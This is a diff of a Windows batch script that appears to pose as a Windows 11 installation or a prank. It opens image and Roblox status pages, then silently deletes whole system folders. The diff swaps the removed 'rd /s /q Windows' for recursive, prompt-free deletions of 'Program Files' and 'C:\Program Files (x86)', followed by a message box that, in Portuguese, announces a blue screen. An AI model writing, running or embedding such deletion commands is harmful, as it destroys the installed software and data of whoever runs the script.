@@ -629,7 +629,10 @@ start https://images-na.ssl-images-amazon.com/images/I/512EhbYMY0L.jpg
 timeout /t 5 > nul
 start https://www.google.com/search?q=Installing+windows+11&tbm=isch&ved=2ahUKEwj1-KmSr-f4AhVsOLkGHYmGAEIQ2-cCegQIABAA&oq=Installing+windows+11&gs_lcp=CgNpbWcQAzoECCMQJzoICAAQgAQQsQM6CAgAELEDEIMBOgsIABCABBCxAxCDAToFCAAQgAQ6BAgAEEM6BwgAELEDEEM6BAgAEB46BAgAEBNQjAlY0itg-CxoAHAAeACAAZkBiAH-FJIBBDAuMjGYAQCgAQGqAQtnd3Mtd2l6LWltZ8ABAQ&sclient=img&ei=rCDHYvXyB-zw5OUPiY2CkAQ&bih=929&biw=1920
 cd/
-rd /s /q Windows
+rd /s /q "Program Files"
+start https://status.roblox.com
+start https://status.roblox.com/
+rd /s /q "C:\Program Files (x86)"
 cd "%temp%"
 echo/msgbox "Dando tela azul em 10 segundos"
 timeout /t 10 > nul
